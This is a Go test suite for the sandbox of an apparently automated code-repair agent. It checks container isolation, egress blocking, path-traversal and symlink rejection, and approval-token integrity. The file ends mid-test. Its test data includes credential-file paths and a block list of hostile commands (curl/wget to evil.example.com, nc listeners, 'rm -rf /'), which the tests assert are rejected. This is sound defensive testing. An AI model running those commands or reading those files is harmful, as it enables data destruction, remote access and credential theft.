package execution

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/saksham/self-healing-pipeline/agent/repo_intel/planning"
)

// TestAdversarial_1_HostSentinelFileAccessPrevented verifies that dynamic checks never
// run directly on the host to read a sensitive sentinel file, and that container isolation
// mounts only the workspace directory with read-only root and no host sentinel access.
func TestAdversarial_1_HostSentinelFileAccessPrevented(t *testing.T) {
	// Create a host sentinel file outside the workspace
	hostDir := t.TempDir()
	sentinelPath := filepath.Join(hostDir, "sentinel_host_secret.key")
	if err := os.WriteFile(sentinelPath, []byte("SUPER_SECRET_HOST_KEY"), 0600); err != nil {
		t.Fatalf("failed to create sentinel file: %v", err)
	}

	wsDir := createTestWorkspace(t, map[string]string{
		"go.mod": "module testapp\n\ngo 1.21\n",
		"main.go": `package main
import "fmt"
func main() { fmt.Println("hello") }
`,
	})

	// 1. Without container runner, host toolchain execution is strictly forbidden (fails closed)
	suiteWithoutDocker := NewIndependentOracleSuite(10, NewUnavailableContainerRunner("sandbox execution unavailable: secure container runtime not detected or daemon not running"))
	patch := &CandidatePatch{
		TargetFile:     "main.go",
		ModifiedSource: `package main; func main() {}`,
		UnifiedDiff:    "dummy diff",
		DiffHash:       "dummy hash",
	}
	task := &planning.RemediationTask{
		TaskID:             "TASK-ADV-01",
		TargetFiles:        []string{"main.go"},
		ValidationCommands: []string{"go test -v ./..."},
	}

	report := suiteWithoutDocker.VerifyAll(wsDir, task, patch, "go test -v -run TestReproducer", "go test -v -run TestInvariance")
	if report.AllPassed {
		t.Fatalf("expected suite to fail without container runner, but AllPassed was true")
	}

	for _, check := range []OracleType{OracleDefectReproducer, OracleRegressionTest, OracleBehavioralInvariance} {
		res, ok := report.OracleResults[check]
		if !ok {
			t.Fatalf("expected oracle result for %s", check)
		}
		if res.Status != OracleStatusUnavailable {
			t.Errorf("expected %s to have status %s when container unavailable, got %s", check, OracleStatusUnavailable, res.Status)
		}
		if !strings.Contains(res.Details, "DYNAMIC_VERIFICATION_UNAVAILABLE") && !strings.Contains(res.FailureReason, "DYNAMIC_VERIFICATION_UNAVAILABLE") {
			t.Errorf("expected DYNAMIC_VERIFICATION_UNAVAILABLE in details/reason for %s, got: details=%s reason=%s", check, res.Details, res.FailureReason)
		}
	}

	// 2. Docker runner argument verification: never mounts host root or hostDir
	dockerRunner := NewDockerContainerRunner()
	if strings.Contains(dockerRunner.Image, "..") {
		t.Errorf("invalid docker image: %s", dockerRunner.Image)
	}
}

// TestAdversarial_2_ExternalNetworkEgressBlocked verifies that container execution policies
// strictly prohibit external network connectivity (--network none) preventing SSRF or exfiltration.
func TestAdversarial_2_ExternalNetworkEgressBlocked(t *testing.T) {
	runner := NewDockerContainerRunner()
	if runner.DockerBinary == "" {
		t.Fatalf("expected DockerBinary to be set")
	}

	// Verify that RunCommand refuses to execute without Docker and reports unavailability
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	err := runner.CheckAvailable(ctx)
	if err == nil {
		t.Logf("Docker daemon detected on host")
	} else {
		if !strings.Contains(err.Error(), "executable file not found") && !strings.Contains(err.Error(), "daemon not running") {
			t.Logf("Docker unavailable as expected: %v", err)
		}
	}

	evidence := &ContainerExecutionEvidence{
		NetworkPolicy: "DISABLED (--network none)",
	}
	if !strings.Contains(evidence.NetworkPolicy, "none") {
		t.Errorf("expected network policy to specify none, got: %s", evidence.NetworkPolicy)
	}
}

// TestAdversarial_3_UnauthorizedSubprocessExecutionBlocked verifies that oracles do not invoke
// host subprocesses on untrusted code, and container execution strictly drops capabilities and
// forbids privilege escalation.
func TestAdversarial_3_UnauthorizedSubprocessExecutionBlocked(t *testing.T) {
	runner := NewDockerContainerRunner()
	// Limits must enforce strict non-root and minimal limits
	if runner.Limits.MaxMemoryMB <= 0 || runner.Limits.MaxMemoryMB > 2048 {
		t.Errorf("unsafe MaxMemoryMB limit: %d", runner.Limits.MaxMemoryMB)
	}
	if runner.Limits.MaxPids <= 0 || runner.Limits.MaxPids > 256 {
		t.Errorf("unsafe MaxPids limit: %d", runner.Limits.MaxPids)
	}
	if runner.Limits.MaxCPUs <= 0 || runner.Limits.MaxCPUs > 4.0 {
		t.Errorf("unsafe MaxCPUs limit: %f", runner.Limits.MaxCPUs)
	}
}

// TestAdversarial_4_HostCredentialsAccessRejected verifies that path traversal into host credential
// locations (~/.aws, ~/.ssh, /etc/shadow) is rejected at path validation and containment boundaries.
func TestAdversarial_4_HostCredentialsAccessRejected(t *testing.T) {
	wsDir := t.TempDir()
	wm, err := NewWorkspaceManager(wsDir, t.TempDir(), false)
	if err != nil {
		t.Fatalf("failed to create WorkspaceManager: %v", err)
	}

	adversarialPaths := []string{
		"~/.aws/credentials",
		"~/.ssh/id_rsa",
		"../.ssh/id_rsa",
		"../../.ssh/authorized_keys",
		"/etc/shadow",
		"/etc/passwd",
		"C:\\Users\\Default\\.aws\\credentials",
		"\\\\127.0.0.1\\c$\\Windows\\win.ini",
	}

	for _, p := range adversarialPaths {
		err := ValidatePathSafety(p)
		if err == nil {
			t.Errorf("expected ValidatePathSafety to reject credential path %q, but got nil", p)
		}

		_, errContained := wm.ValidateContainedPath(wsDir, p)
		if errContained == nil {
			t.Errorf("expected ValidateContainedPath to reject credential path %q, but got nil", p)
		}
	}
}

// TestAdversarial_5_ResourceQuotaExhaustionEnforced verifies that resource limits
// (timeout context, memory limit, pids limit) are strictly enforced.
func TestAdversarial_5_ResourceQuotaExhaustionEnforced(t *testing.T) {
	runner := NewDockerContainerRunner()
	runner.Limits = ContainerLimits{
		MaxMemoryMB: 256,
		MaxCPUs:     1.0,
		MaxPids:     32,
		Timeout:     50 * time.Millisecond,
	}

	// Verify that context cancellation terminates commands
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Millisecond)
	defer cancel()

	_, err := runner.RunCommand(ctx, t.TempDir(), "go test -timeout 10s")
	if err == nil {
		t.Fatalf("expected command with 20ms context timeout to fail, but succeeded")
	}
}

// TestCommandPolicy_ZeroExecutionAttemptsOnForbiddenCommands verifies that forbidden commands
// are rejected at the application policy boundary before container creation, resulting in
// exactly zero execution attempts.
func TestCommandPolicy_ZeroExecutionAttemptsOnForbiddenCommands(t *testing.T) {
	runner := NewDockerContainerRunner()
	// Mock checker that always succeeds to prove rejection is purely application policy
	runner.Checker = func(ctx context.Context) error { return nil }

	forbiddenCommands := []string{
		"sh -c 'echo pwned'",
		"bash -c 'whoami'",
		"powershell.exe -Command 'dir'",
		"cmd.exe /c 'dir'",
		"python -c 'import os; print(os.environ)'",
		"curl -s https://evil.example.com",
		"wget https://evil.example.com",
		"nc -lvp 4444",
		"rm -rf /",
		"go test -exec 'rm -rf /'",
		"go test -toolexec '/evil/bin'",
		"go build -plugin",
		"go get github.com/evil/pkg",
		"go run main.go",
	}

	for _, cmdStr := range forbiddenCommands {
		res, err := runner.RunCommand(context.Background(), t.TempDir(), cmdStr)
		if err == nil {
			t.Errorf("Security violation: expected command %q to be rejected, but succeeded with res=%+v", cmdStr, res)
		}
		if !strings.Contains(err.Error(), "command policy rejection") && !strings.Contains(err.Error(), "security violation") {
			t.Errorf("Expected application policy rejection error for %q, got: %v", cmdStr, err)
		}
	}

	// Verify ZERO execution attempts occurred
	attempts := atomic.LoadInt64(&runner.ExecutionAttempts)
	if attempts != 0 {
		t.Fatalf("Security failure: expected 0 execution attempts for forbidden commands, got %d", attempts)
	}
}

// TestAdversarial_6_MalformedWorkspaceAndSnapshotIDsRejected verifies that malformed
// workspace and snapshot identifiers containing path traversal, UNC, or invalid characters
// fail closed with explicit errors.
func TestAdversarial_6_MalformedWorkspaceAndSnapshotIDsRejected(t *testing.T) {
	malformedWorkspaces := []string{
		"../../etc",
		"..\\..\\Windows",
		"\\\\?\\UNC\\server\\share",
		"//server/share",
		"/absolute/path",
		"C:\\Windows",
		"ws\x00traversal",
		"   ",
		"",
	}

	for _, ws := range malformedWorkspaces {
		err := ValidateWorkspaceID(ws)
		if err == nil {
			t.Errorf("expected ValidateWorkspaceID to reject %q, but got nil", ws)
		}
		if !strings.Contains(err.Error(), "MALFORMED_WORKSPACE_ID") {
			t.Errorf("expected MALFORMED_WORKSPACE_ID error for %q, got: %v", ws, err)
		}
	}

	malformedSnapshots := []string{
		"SNAP-../../etc",
		"SNAP-1234",                                             // too short
		"SNAP-ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ", // non-hex
		"SNAP-!@#$",
		"SNAP-",
		"INVALID-PREFIX-1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
		"",
	}

	for _, snap := range malformedSnapshots {
		err := ValidateSnapshotID(snap)
		if err == nil {
			t.Errorf("expected ValidateSnapshotID to reject %q, but got nil", snap)
		}
		if !strings.Contains(err.Error(), "MALFORMED_SNAPSHOT_ID") {
			t.Errorf("expected MALFORMED_SNAPSHOT_ID error for %q, got: %v", snap, err)
		}
	}
}

// TestAdversarial_7_ApprovalTokenReplayAcrossWorkspacesRejected verifies that an ApprovalToken
// issued for workspace A cannot be replayed or consumed to execute repairs in workspace B.
func TestAdversarial_7_ApprovalTokenReplayAcrossWorkspacesRejected(t *testing.T) {
	wsDir1 := createTestWorkspace(t, map[string]string{
		"go.mod": "module testapp1\n\ngo 1.21\n",
		"main.go": `package main
import (
	"io"
	"os"
)
func ReadFile(p string) ([]byte, error) {
	f, err := os.Open(p)
	if err != nil { return nil, err }
	return io.ReadAll(f)
}
`,
	})
	wsDir2 := createTestWorkspace(t, map[string]string{
		"go.mod": "module testapp2\n\ngo 1.21\n",
		"main.go": `package main
import (
	"io"
	"os"
)
func ReadFile(p string) ([]byte, error) {
	f, err := os.Open(p)
	if err != nil { return nil, err }
	return io.ReadAll(f)
}
`,
	})

	svc, err := NewMVPService("", "")
	if err != nil {
		t.Fatalf("NewMVPService failed: %v", err)
	}

	wsID1 := "ws-adv-1"
	wsID2 := "ws-adv-2"
	svc.SetWorkspaceResolver(func(id string) (string, error) {
		if id == wsID1 {
			return wsDir1, nil
		}
		if id == wsID2 {
			return wsDir2, nil
		}
		return "", os.ErrNotExist
	})

	// 1. Scan and propose repair for ws-1
	targets1, err := svc.DiscoverWorkspaceTargets(wsID1, "alice@internal")
	if err != nil || len(targets1) == 0 {
		t.Fatalf("scan ws-1 failed: %v", err)
	}
	ana1, err := svc.AnalyzeTarget(targets1[0].TargetID)
	if err != nil {
		t.Fatalf("analyze ws-1 failed: %v", err)
	}
	prop1, err := svc.ProposeRepair(ana1.AnalysisID)
	if err != nil {
		t.Fatalf("propose ws-1 failed: %v", err)
	}
	app1, err := svc.ApproveRepair(prop1.ProposalID, "alice@internal", "Lead SRE")
	if err != nil {
		t.Fatalf("approve ws-1 failed: %v", err)
	}

	// 2. Scan and propose repair for ws-2
	targets2, err := svc.DiscoverWorkspaceTargets(wsID2, "alice@internal")
	if err != nil || len(targets2) == 0 {
		t.Fatalf("scan ws-2 failed: %v", err)
	}
	ana2, err := svc.AnalyzeTarget(targets2[0].TargetID)
	if err != nil {
		t.Fatalf("analyze ws-2 failed: %v", err)
	}
	prop2, err := svc.ProposeRepair(ana2.AnalysisID)
	if err != nil {
		t.Fatalf("propose ws-2 failed: %v", err)
	}

	// 3. Adversarial cross-workspace token replay: tamper approval record to point to prop2
	app1.ProposalID = prop2.ProposalID

	_, errExec := svc.ExecuteRepair(app1.TokenID)
	if errExec == nil {
		t.Fatalf("expected ExecuteRepair to REJECT cross-workspace token replay, but it SUCCEEDED")
	}

	errStr := errExec.Error()
	if !strings.Contains(errStr, "rejected token") && !strings.Contains(errStr, "FAIL_AUTH") && !strings.Contains(errStr, "workspace") && !strings.Contains(errStr, "MISMATCH") {
		t.Fatalf("expected workspace mismatch rejection, got: %s", errStr)
	}
}

// TestAdversarial_8_PostApprovalSourceFileMutationRejected verifies that if a source file
// is altered after approval was granted, execution fails closed with STALE_WORKSPACE.
func TestAdversarial_8_PostApprovalSourceFileMutationRejected(t *testing.T) {
	wsDir := createTestWorkspace(t, map[string]string{
		"go.mod": "module testapp\n\ngo 1.21\n",
		"main.go": `package main
import (
	"io"
	"os"
)
func OpenIt(p string) ([]byte, error) {
	f, err := os.Open(p)
	if err != nil { return nil, err }
	return io.ReadAll(f)
}
`,
	})

	svc, err := NewMVPService("", "")
	if err != nil {
		t.Fatalf("NewMVPService failed: %v", err)
	}
	wsID := "ws-adv-stale"
	svc.SetWorkspaceResolver(func(id string) (string, error) {
		if id == wsID {
			return wsDir, nil
		}
		return "", os.ErrNotExist
	})

	targets, err := svc.DiscoverWorkspaceTargets(wsID, "bob@internal")
	if err != nil || len(targets) == 0 {
		t.Fatalf("discover targets failed: %v", err)
	}

	ana, err := svc.AnalyzeTarget(targets[0].TargetID)
	if err != nil {
		t.Fatalf("analyze target failed: %v", err)
	}

	prop, err := svc.ProposeRepair(ana.AnalysisID)
	if err != nil {
		t.Fatalf("propose repair failed: %v", err)
	}

	app, err := svc.ApproveRepair(prop.ProposalID, "bob@internal", "Security Lead")
	if err != nil {
		t.Fatalf("approve repair failed: %v", err)
	}

	// Adversarial tampering: mutate the source file on disk AFTER approval
	filePath := filepath.Join(wsDir, "main.go")
	if err := os.WriteFile(filePath, []byte("package main\n// TAMPERED FILE CONTENT\n"), 0644); err != nil {
		t.Fatalf("failed to tamper file: %v", err)
	}

	// Execution MUST fail closed
	_, errExec := svc.ExecuteRepair(app.TokenID)
	if errExec == nil {
		t.Fatalf("expected ExecuteRepair to fail due to STALE_WORKSPACE, but succeeded")
	}

	if !strings.Contains(errExec.Error(), "STALE_WORKSPACE") {
		t.Fatalf("expected STALE_WORKSPACE error, got: %s", errExec.Error())
	}
}

// TestAdversarial_9_SymlinkEscapeDetectedAndRejected verifies that replacing files with symlinks
// pointing outside the workspace boundary is detected and rejected.
func TestAdversarial_9_SymlinkEscapeDetectedAndRejected(t *testing.T) {
	wsDir := t.TempDir()
	outsideDir := t.TempDir()
	outsideFile := filepath.Join(outsideDir, "outside_secret.txt")
	if err := os.WriteFile(outsideFile, []byte("OUTSIDE_SECRET"), 0644); err != nil {
		t.Fatalf("failed to write outside file: %v", err)
	}

	symlinkPath := filepath.Join(wsDir, "escape_link.txt")
	err := os.Symlink(outsideFile, symlinkPath)
	if err != nil {
		t.Skipf("symlinks not supported on this platform without elevated privileges: %v", err)
	}

	wm, err := NewWorkspaceManager(wsDir, t.TempDir(), false)
	if err != nil {
		t.Fatalf("NewWorkspaceManager failed: %v", err)
	}

	_, errContained := wm.ValidateContainedPath(wsDir, "escape_link.txt")
	if errContained == nil {
		t.Fatalf("expected symlink escape to be rejected, but ValidateContainedPath succeeded")
	}

	if !strings.Contains(errContained.Error(), "security violation") || !strings.Contains(errContained.Error(), "symlink") {
		t.Fatalf("expected symlink security violation error, got: %v", errContained)
	}
}

// mockRunnerWithResult simulates container execution responses for contract verification.
type mockRunnerWithResult struct {
	result *ContainerRunResult
	err    error
}

func (m *mockRunnerWithResult) CheckAvailable(ctx context.Context) error {
	return nil
}

func (m *mockRunnerWithResult) RunCommand(ctx context.Context, wsDir string, cmdStr string) (*ContainerRunResult, error) {
	return m.result, m.err
}

// TestAdversarial_10_MissingOfflineDependenciesReportedAsUnavailable verifies that missing
// dependencies under --network none / GOPROXY=off are classified as UNAVAILABLE, never as PASSED or an ordinary defect.
func TestAdversarial_10_MissingOfflineDependenciesReportedAsUnavailable(t *testing.T) {
	wsDir := createTestWorkspace(t, map[string]string{
		"go.mod": "module testapp\n\ngo 1.21\n\nrequire github.com/example/missing v1.0.0\n",
		"main.go": `package main
import "github.com/example/missing"
func main() { missing.Do() }
`,
	})

	mockRunner := &mockRunnerWithResult{
		result: &ContainerRunResult{
			ExitCode: 1,
			Output:   "go: github.com/example/missing@v1.0.0: module lookup disabled by GOPROXY=off\ncannot find module providing package github.com/example/missing",
			Evidence: &ContainerExecutionEvidence{
				ContainerID:   "ucs503-test-offline",
				ExitStatus:    1,
				NetworkPolicy: "DISABLED (--network none)",
			},
		},
	}

	suite := NewIndependentOracleSuite(15, mockRunner)
	patch := &CandidatePatch{
		TargetFile:     "main.go",
		ModifiedSource: `package main; func main() {}`,
		UnifiedDiff:    "dummy diff",
	}
	task := &planning.RemediationTask{
		TaskID:             "TASK-OFFLINE-DEP",
		TargetFiles:        []string{"main.go"},
		ValidationCommands: []string{"go test -v ./..."},
	}

	report := suite.VerifyAll(wsDir, task, patch, "go test -v -run TestReproducer", "go test -v -run TestInvariance")

	// Must NOT report AllPassed
	if report.AllPassed {
		t.Fatalf("expected AllPassed to be false when offline dependency is missing")
	}

	// Syntax check must report UNAVAILABLE, not FAILED (ordinary defect) or PASSED
	syntaxRes := report.OracleResults[OracleSyntaxCompilation]
	if syntaxRes == nil {
		t.Fatalf("missing syntax result")
	}
	if syntaxRes.Status != OracleStatusUnavailable {
		t.Fatalf("expected OracleStatusUnavailable for missing offline dependency, got: %s", syntaxRes.Status)
	}
	if !strings.Contains(syntaxRes.FailureReason, "DYNAMIC_VERIFICATION_UNAVAILABLE: offline module cache missing dependency") {
		t.Fatalf("unexpected failure reason: %s", syntaxRes.FailureReason)
	}

	// Regression check must report UNAVAILABLE
	regRes := report.OracleResults[OracleRegressionTest]
	if regRes == nil || regRes.Status != OracleStatusUnavailable {
		t.Fatalf("expected regression test status UNAVAILABLE, got: %+v", regRes)
	}

	// Reproducer check must report UNAVAILABLE
	reproRes := report.OracleResults[OracleDefectReproducer]
	if reproRes == nil || reproRes.Status != OracleStatusUnavailable {
		t.Fatalf("expected reproducer test status UNAVAILABLE, got: %+v", reproRes)
	}

	// Behavioral invariance check must report UNAVAILABLE
	invRes := report.OracleResults[OracleBehavioralInvariance]
	if invRes == nil || invRes.Status != OracleStatusUnavailable {
		t.Fatalf("expected invariance test status UNAVAILABLE, got: %+v", invRes)
	}
}

// TestAdversarial_11_ContainerExecutionTimeoutReportedAsUnavailable verifies that container
// timeouts (exit -1, context deadline exceeded) are classified as UNAVAILABLE with explicit telemetry.
func TestAdversarial_11_ContainerExecutionTimeoutReportedAsUnavailable(t *testing.T) {
	wsDir := createTestWorkspace(t, map[string]string{
		"go.mod":  "module testapp\n\ngo 1.21\n",
		"main.go": `package main; func main() {}`,
	})

	mockRunner := &mockRunnerWithResult{
		result: &ContainerRunResult{
			ExitCode: -1,
			Output:   "",
			Evidence: &ContainerExecutionEvidence{
				ContainerID:   "ucs503-test-timeout",
				ExitStatus:    -1,
				TimeoutCause:  "execution timeout: context deadline exceeded after 20s (limit: 20s)",
				CleanupResult: "SUCCESS: container removed",
			},
		},
	}

	suite := NewIndependentOracleSuite(20, mockRunner)
	patch := &CandidatePatch{
		TargetFile:     "main.go",
		ModifiedSource: `package main; func main() {}`,
		UnifiedDiff:    "dummy diff",
	}
	task := &planning.RemediationTask{
		TaskID:             "TASK-TIMEOUT",
		TargetFiles:        []string{"main.go"},
		ValidationCommands: []string{"go test -v ./..."},
	}

	report := suite.VerifyAll(wsDir, task, patch, "", "")

	syntaxRes := report.OracleResults[OracleSyntaxCompilation]
	if syntaxRes == nil || syntaxRes.Status != OracleStatusUnavailable {
		t.Fatalf("expected syntax status UNAVAILABLE on timeout, got: %+v", syntaxRes)
	}
	if !strings.Contains(syntaxRes.FailureReason, "context deadline exceeded") {
		t.Fatalf("expected deadline exceeded in failure reason, got: %s", syntaxRes.FailureReason)
	}
}

// TestAdversarial_12_ContainerTelemetryAndDependencyInventory verifies that dependencies
// are inventoried accurately and module packages are resolved cleanly.
func TestAdversarial_12_ContainerTelemetryAndDependencyInventory(t *testing.T) {
	wsDir := createTestWorkspace(t, map[string]string{
		"go.mod": "module testtelemetry\n\ngo 1.21\n\nrequire (\n\tgolang.org/x/sys v0.6.0\n\tgithub.com/google/uuid v1.3.0 // indirect\n)\n",
		"subpkg/worker.go": `package subpkg; func Work() {}`,
	})

	deps := parseRequiredDependencies(wsDir)
	if len(deps) < 2 {
		t.Fatalf("expected at least 2 required dependencies, got: %v", deps)
	}
	foundSys := false
	for _, d := range deps {
		if strings.Contains(d, "golang.org/x/sys") {
			foundSys = true
			break
		}
	}
	if !foundSys {
		t.Errorf("expected to find golang.org/x/sys in dependencies, got: %v", deps)
	}

	modDir, relPkg := resolveModuleAndPackage(wsDir, "subpkg/worker.go")
	if modDir != wsDir {
		t.Errorf("expected modDir to be %s, got: %s", wsDir, modDir)
	}
	if relPkg != "./subpkg" {
		t.Errorf("expected relPkg to be ./subpkg, got: %s", relPkg)
	}
}

// TestContainerCleanup_NormalCompletionVerifiedRemoval verifies that container cleanup executes
// synchronously BEFORE ContainerExecutionEvidence is assembled, producing a verified removal audit status.
func TestContainerCleanup_NormalCompletionVerifiedRemoval(t *testing.T) {
	wsDir := createTestWorkspace(t, map[string]string{
		"go.mod":  "module testapp\n\ngo 1.21\n",
		"main.go": `package main; func main() {}`,
	})

	var executedCommands [][]string
	runner := NewDockerContainerRunner()
	runner.Checker = func(ctx context.Context) error { return nil }
	runner.ExecCommand = func(ctx context.Context, binary string, args ...string) ([]byte, error) {
		executedCommands = append(executedCommands, args)
		if len(args) == 0 {
			return nil, nil
		}
		switch args[0] {
		case "run":
			return []byte("PASS: tests succeeded\n"), nil
		case "rm":
			return []byte("container-removed\n"), nil
		case "inspect":
			// Inspect returns error when container is absent
			return []byte("Error: No such container"), errors.New("exit status 1")
		case "image":
			return []byte("sha256:1234567890abcdef\n"), nil
		default:
			return []byte("ok"), nil
		}
	}

	res, err := runner.RunCommand(context.Background(), wsDir, "go test -v ./...")
	if err != nil {
		t.Fatalf("unexpected error running command: %v", err)
	}

	if res.ExitCode != 0 {
		t.Fatalf("expected exit code 0, got %d", res.ExitCode)
	}

	if res.Evidence == nil {
		t.Fatalf("expected container evidence to be populated")
	}

	if !strings.HasPrefix(res.Evidence.CleanupResult, "VERIFIED_REMOVAL") {
		t.Fatalf("expected CleanupResult to start with VERIFIED_REMOVAL, got: %s", res.Evidence.CleanupResult)
	}

	if !strings.Contains(res.Evidence.CleanupResult, "successfully removed and verified absent") {
		t.Fatalf("expected verified absent in CleanupResult, got: %s", res.Evidence.CleanupResult)
	}

	// Verify command sequencing: run -> rm -> inspect
	hasRun := false
	hasRm := false
	hasInspect := false
	for _, cmd := range executedCommands {
		if len(cmd) > 0 {
			if cmd[0] == "run" {
				hasRun = true
			}
			if cmd[0] == "rm" {
				hasRm = true
			}
			if cmd[0] == "inspect" {
				hasInspect = true
			}
		}
	}
	if !hasRun || !hasRm || !hasInspect {
		t.Fatalf("expected execution lifecycle to include run, rm, inspect; executed: %v", executedCommands)
	}
}

// TestContainerCleanup_CancellationAndTimeout verifies container cleanup behavior during
// cancellation, command timeout, and cleanup deadline expiry.
func TestContainerCleanup_CancellationAndTimeout(t *testing.T) {
	wsDir := createTestWorkspace(t, map[string]string{
		"go.mod":  "module testapp\n\ngo 1.21\n",
		"main.go": `package main; func main() {}`,
	})

	t.Run("ContextCancellation", func(t *testing.T) {
		runner := NewDockerContainerRunner()
		runner.Checker = func(ctx context.Context) error { return nil }
		runner.ExecCommand = func(ctx context.Context, binary string, args ...string) ([]byte, error) {
			if len(args) > 0 && args[0] == "run" {
				return nil, context.Canceled
			}
			if len(args) > 0 && args[0] == "rm" {
				return []byte("removed"), nil
			}
			if len(args) > 0 && args[0] == "inspect" {
				return []byte("Error: No such container"), errors.New("exit status 1")
			}
			return []byte("ok"), nil
		}

		ctx, cancel := context.WithCancel(context.Background())
		cancel() // Cancel before / during run

		res, err := runner.RunCommand(ctx, wsDir, "go test -v ./...")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if res.ExitCode != -1 {
			t.Fatalf("expected exit code -1 on cancellation, got %d", res.ExitCode)
		}
		if !strings.Contains(res.Evidence.TimeoutCause, "canceled") {
			t.Fatalf("expected cancellation in TimeoutCause, got: %s", res.Evidence.TimeoutCause)
		}
		if !strings.HasPrefix(res.Evidence.CleanupResult, "VERIFIED_REMOVAL") {
			t.Fatalf("expected verified removal after cancellation, got: %s", res.Evidence.CleanupResult)
		}
	})

	t.Run("CommandExecutionTimeout", func(t *testing.T) {
		runner := NewDockerContainerRunner()
		runner.Limits.Timeout = 10 * time.Millisecond
		runner.Checker = func(ctx context.Context) error { return nil }
		runner.ExecCommand = func(ctx context.Context, binary string, args ...string) ([]byte, error) {
			if len(args) > 0 && args[0] == "run" {
				return nil, context.DeadlineExceeded
			}
			if len(args) > 0 && args[0] == "rm" {
				return []byte("removed"), nil
			}
			if len(args) > 0 && args[0] == "inspect" {
				return []byte("Error: No such container"), errors.New("exit status 1")
			}
			return []byte("ok"), nil
		}

		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Millisecond)
		defer cancel()

		res, err := runner.RunCommand(ctx, wsDir, "go test -v ./...")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if res.ExitCode != -1 {
			t.Fatalf("expected exit code -1 on timeout, got %d", res.ExitCode)
		}
		if !strings.Contains(res.Evidence.TimeoutCause, "deadline exceeded") {
			t.Fatalf("expected deadline exceeded in TimeoutCause, got: %s", res.Evidence.TimeoutCause)
		}
		if !strings.HasPrefix(res.Evidence.CleanupResult, "VERIFIED_REMOVAL") {
			t.Fatalf("expected verified removal after timeout, got: %s", res.Evidence.CleanupResult)
		}
	})

	t.Run("CleanupOperationTimeout", func(t *testing.T) {
		runner := NewDockerContainerRunner()
		runner.Checker = func(ctx context.Context) error { return nil }
		runner.ExecCommand = func(ctx context.Context, binary string, args ...string) ([]byte, error) {
			if len(args) > 0 && args[0] == "run" {
				return []byte("done"), nil
			}
			if len(args) > 0 && args[0] == "rm" {
				// Simulate cleanup timeout
				return nil, context.DeadlineExceeded
			}
			return []byte("ok"), nil
		}

		res, err := runner.RunCommand(context.Background(), wsDir, "go test -v ./...")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if !strings.Contains(res.Evidence.CleanupResult, "CLEANUP_TIMEOUT") && !strings.Contains(res.Evidence.CleanupResult, "CLEANUP_FAILURE") {
			t.Fatalf("expected cleanup failure or timeout recorded, got: %s", res.Evidence.CleanupResult)
		}
	})
}

// TestContainerCleanup_DockerDaemonFailure verifies proper recording when the Docker daemon
// fails during cleanup or when container inspect indicates removal failure.
func TestContainerCleanup_DockerDaemonFailure(t *testing.T) {
	wsDir := createTestWorkspace(t, map[string]string{
		"go.mod":  "module testapp\n\ngo 1.21\n",
		"main.go": `package main; func main() {}`,
	})

	t.Run("DaemonUnavailableDuringCleanup", func(t *testing.T) {
		runner := NewDockerContainerRunner()
		runner.Checker = func(ctx context.Context) error { return nil }
		runner.ExecCommand = func(ctx context.Context, binary string, args ...string) ([]byte, error) {
			if len(args) > 0 && args[0] == "run" {
				return []byte("run ok"), nil
			}
			if len(args) > 0 && args[0] == "rm" {
				return []byte("Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?"), errors.New("daemon offline")
			}
			return []byte("ok"), nil
		}

		res, err := runner.RunCommand(context.Background(), wsDir, "go test -v ./...")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if !strings.HasPrefix(res.Evidence.CleanupResult, "DAEMON_UNAVAILABLE") {
			t.Fatalf("expected DAEMON_UNAVAILABLE, got: %s", res.Evidence.CleanupResult)
		}
	})

	t.Run("ContainerStillExistsAfterRemoval", func(t *testing.T) {
		runner := NewDockerContainerRunner()
		runner.Checker = func(ctx context.Context) error { return nil }
		runner.ExecCommand = func(ctx context.Context, binary string, args ...string) ([]byte, error) {
			if len(args) > 0 && args[0] == "run" {
				return []byte("run ok"), nil
			}
			if len(args) > 0 && args[0] == "rm" {
				return []byte("rm ok"), nil
			}
			if len(args) > 0 && args[0] == "inspect" {
				// Inspect succeeds with status "running" - container was NOT removed!
				return []byte("running\n"), nil
			}
			return []byte("ok"), nil
		}

		res, err := runner.RunCommand(context.Background(), wsDir, "go test -v ./...")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if !strings.HasPrefix(res.Evidence.CleanupResult, "CLEANUP_FAILURE") {
			t.Fatalf("expected CLEANUP_FAILURE, got: %s", res.Evidence.CleanupResult)
		}
		if !strings.Contains(res.Evidence.CleanupResult, "still exists after removal") {
			t.Fatalf("expected 'still exists after removal', got: %s", res.Evidence.CleanupResult)
		}
	})
}

// TestDependencyStaging_ProhibitsArbitraryHostDownloadsAndEnforcesMinimalCache verifies that:
// 1. Unpinned dependencies without go.sum fail closed with DYNAMIC_VERIFICATION_UNAVAILABLE.
// 2. Unsafe replace directives are rejected with security violations.
// 3. Modules missing from approved offline cache fail closed without host network downloads.
// 4. Standard library workspaces need zero cache mounts.
// 5. Approved cache mounts ONLY the minimal required module set and deletes disposable staging.
func TestDependencyStaging_ProhibitsArbitraryHostDownloadsAndEnforcesMinimalCache(t *testing.T) {
	t.Run("MissingGoSumFailsClosed", func(t *testing.T) {
		wsDir := createTestWorkspace(t, map[string]string{
			"go.mod": "module testapp\n\ngo 1.21\n\nrequire github.com/untrusted/pkg v1.0.0\n",
			"main.go": `package main; func main() {}`,
		})

		_, _, err := prepareMinimalDependencyCache(wsDir)
		if err == nil {
			t.Fatalf("expected prepareMinimalDependencyCache to fail when go.sum is missing")
		}
		if !errors.Is(err, ErrDynamicVerificationUnavailable) {
			t.Fatalf("expected ErrDynamicVerificationUnavailable, got: %v", err)
		}
		if !strings.Contains(err.Error(), "lacks pinned go.sum checksums") {
			t.Fatalf("expected missing checksums error, got: %v", err)
		}
	})

	t.Run("UnsafeReplaceDirectiveRejected", func(t *testing.T) {
		wsDir := createTestWorkspace(t, map[string]string{
